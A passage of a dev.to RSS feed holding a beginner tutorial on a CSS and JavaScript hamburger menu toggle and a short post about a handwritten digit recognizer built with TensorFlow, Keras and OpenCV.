    &lt;span class="nt"&gt;&amp;lt;meta&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"viewport"&lt;/span&gt; &lt;span class="na"&gt;content=&lt;/span&gt;&lt;span class="s"&gt;"width=device-width, initial-scale=1"&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;link&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;"style.css"&lt;/span&gt; &lt;span class="na"&gt;rel=&lt;/span&gt;&lt;span class="s"&gt;"stylesheet"&lt;/span&gt;&lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;body&amp;gt;&lt;/span&gt;

    &lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"hum_toggle"&lt;/span&gt;  &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"hum-toggle"&lt;/span&gt; &lt;span class="na"&gt;onclick=&lt;/span&gt;&lt;span class="s"&gt;"togglehum()"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;span&amp;gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
       &lt;span class="nt"&gt;&amp;lt;span&amp;gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;

    &lt;span class="nt"&gt;&amp;lt;script &lt;/span&gt;&lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;"main.js"&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;"text/javascript"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In &lt;code&gt;index.html&lt;/code&gt; ,I have created &lt;strong&gt;two spans tags&lt;/strong&gt; within an outer div. The &lt;code&gt;onclick&lt;/code&gt; event is used to trigger a function when an element is clicked on. When you click the &lt;code&gt;.hum_toggle&lt;/code&gt; div element, &lt;code&gt;togglehum()&lt;/code&gt; function will be triggered. The &lt;code&gt;togglehum()&lt;/code&gt; function has declared in &lt;code&gt;main.js&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;style.css&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="nc"&gt;.hum_toggle&lt;/span&gt;
   &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nl"&gt;position&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;relative&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="nl"&gt;width&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;50px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="nl"&gt;height&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;50px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="nl"&gt;cursor&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;pointer&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="nl"&gt;border&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;solid&lt;/span&gt; &lt;span class="no"&gt;black&lt;/span&gt; &lt;span class="m"&gt;2px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="nl"&gt;border-radius&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;50%&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
   &lt;span class="p"&gt;}&lt;/span&gt;


&lt;span class="nc"&gt;.hum_toggle&lt;/span&gt; &lt;span class="nt"&gt;span&lt;/span&gt;
   &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nl"&gt;position&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;absolute&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="nl"&gt;top&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;50%&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="nl"&gt;left&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;50%&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="nl"&gt;transform&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;translate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="m"&gt;-50%&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="m"&gt;-50%&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="nl"&gt;width&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;60%&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="nl"&gt;height&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;4px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="nl"&gt;transition&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;all&lt;/span&gt; &lt;span class="m"&gt;300ms&lt;/span&gt; &lt;span class="n"&gt;ease-in-out&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="nl"&gt;border-radius&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;5px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="nl"&gt;background&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="no"&gt;black&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
   &lt;span class="p"&gt;}&lt;/span&gt;


&lt;span class="nc"&gt;.hum_toggle&lt;/span&gt; &lt;span class="nt"&gt;span&lt;/span&gt;&lt;span class="nd"&gt;:nth-child&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="err"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
   &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nl"&gt;top&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;40%&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
   &lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nc"&gt;.hum_toggle&lt;/span&gt; &lt;span class="nt"&gt;span&lt;/span&gt;&lt;span class="nd"&gt;:nth-child&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="err"&gt;2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
   &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nl"&gt;top&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;60%&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
   &lt;span class="p"&gt;}&lt;/span&gt;


&lt;span class="nc"&gt;.hum_toggle.active&lt;/span&gt; &lt;span class="nt"&gt;span&lt;/span&gt;&lt;span class="nd"&gt;:nth-child&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="err"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
   &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nl"&gt;top&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;50%&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="nl"&gt;transform&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;translate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="m"&gt;-50%&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="m"&gt;-50%&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;rotate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="m"&gt;45deg&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
   &lt;span class="p"&gt;}&lt;/span&gt;


&lt;span class="nc"&gt;.hum_toggle.active&lt;/span&gt; &lt;span class="nt"&gt;span&lt;/span&gt;&lt;span class="nd"&gt;:nth-child&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="err"&gt;2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
   &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="nl"&gt;top&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;50%&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
      &lt;span class="nl"&gt;transform&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;translate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="m"&gt;-50%&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="m"&gt;-50%&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;rotate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="m"&gt;-45deg&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
   &lt;span class="p"&gt;}&lt;/span&gt;


&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--JOYjLdxo--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://community.codenewbie.org/remoteimages/uploads/articles/xg821apxfzpgxbhc6bpf.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--JOYjLdxo--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://community.codenewbie.org/remoteimages/uploads/articles/xg821apxfzpgxbhc6bpf.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;




&lt;p&gt;So,let's see how &lt;code&gt;span:nth-child(1)&lt;/code&gt; and &lt;code&gt;span:nth-child(2)&lt;/code&gt; child selectors are working.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--cXgHa5lW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://community.codenewbie.org/remoteimages/uploads/articles/fur4zwbi435i4o79utzq.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--cXgHa5lW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://community.codenewbie.org/remoteimages/uploads/articles/fur4zwbi435i4o79utzq.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;main.js&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;togglehum&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;hum&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;getElementById&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;hum-toggle&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;hum&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;classList&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;toggle&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;active&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;If the togglehum function triggered, the &lt;code&gt;active&lt;/code&gt; class adds to the &lt;code&gt;hum_toggle&lt;/code&gt; class.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--WnTBTRyy--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://community.codenewbie.org/remoteimages/uploads/articles/uhi1op3v806xxeppb9eh.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--WnTBTRyy--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://community.codenewbie.org/remoteimages/uploads/articles/uhi1op3v806xxeppb9eh.PNG" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--LQKguggO--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://community.codenewbie.org/remoteimages/uploads/articles/razp1t56jaa27tdzw8od.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--LQKguggO--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://community.codenewbie.org/remoteimages/uploads/articles/razp1t56jaa27tdzw8od.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://youtu.be/YURgKce25Ig"&gt;Demo&lt;/a&gt;&lt;br&gt;
Hope you will enjoy this article. See you in the next one and don't forget to subscribe my channelüòäüòä&lt;/p&gt;

</description>
      <category>html</category>
      <category>webdev</category>
      <category>codenewbie</category>
      <category>css</category>
    </item>
    <item>
      <title>HandWritten Digit Recognizer || Tensorflow || Keras ||  OpenCV</title>
      <author>Gaurav Singh</author>
      <pubDate>Sat, 05 Jun 2021 16:55:17 +0000</pubDate>
      <link>https://dev.to/gauravsingh9356/handwritten-digit-recognizer-1j0f</link>
      <guid>https://dev.to/gauravsingh9356/handwritten-digit-recognizer-1j0f</guid>
      <description>&lt;p&gt;Hello Devs! I have completed ùêáùêöùêßùêùùê∞ùê´ùê¢ùê≠ùê≠ùêûùêß ùêÉùê¢ùê†ùê¢ùê≠ ùêëùêûùêúùê®ùê†ùêßùê¢ùê≠ùê¢ùê®ùêß. It is my first work with TensorFlow and OpenCV together. Had a very nice experience while working on this project.&lt;br&gt;
This indeed has given me insights into the never-ending potential of the machine learning domain.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Emyy2dcP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/234luedyp2v8me3l3dni.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Emyy2dcP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/234luedyp2v8me3l3dni.png" alt="computer_vision"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ùêçùêûùê≠ùê∞ùê®ùê´ùê§ ùêÆùê¨ùêûùêù : ùêÇùê®ùêßùêØùê®ùê•ùêÆùê≠ùê¢ùê®ùêßùêöùê• ùêçùêûùê≠ùê∞ùê®ùê´ùê§&lt;br&gt;
ùêÉùêöùê≠ùêöùê¨ùêûùê≠ : ùêåùêçùêàùêíùêì ùêÉùêöùê≠ùêöùê¨ùêûùê≠&lt;br&gt;
ùêÖùê´ùêöùê¶ùêûùê∞ùê®ùê´ùê§ ùêÆùê¨ùêûùêù : ùêìùêûùêßùê¨ùê®ùê´ùêüùê•ùê®ùê∞&lt;br&gt;
ùêÄùêèùêà ùêÆùê¨ùêûùêù : ùêäùêûùê´ùêöùê¨&lt;br&gt;
ùêÇùê®ùê¶ùê©ùêÆùê≠ùêûùê´ ùêïùê¢ùê¨ùê¢ùê®ùêß ùê•ùê¢ùêõùê´ùêöùê´ùê≤ ùêÆùê¨ùêûùêù : ùê®ùê©ùêûùêßùêÇùêï&lt;/p&gt;

&lt;p&gt;&lt;a href="https://github.com/GauravSingh9356/Computer-Vision"&gt;GitHub link&lt;/a&gt;&lt;/p&gt;

</description>
      <category>deeplearning</category>
      <category>machinelearning</category>
      <category>devops</category>
      <category>opensource</category>
    </item>
  </channel>
</rss>
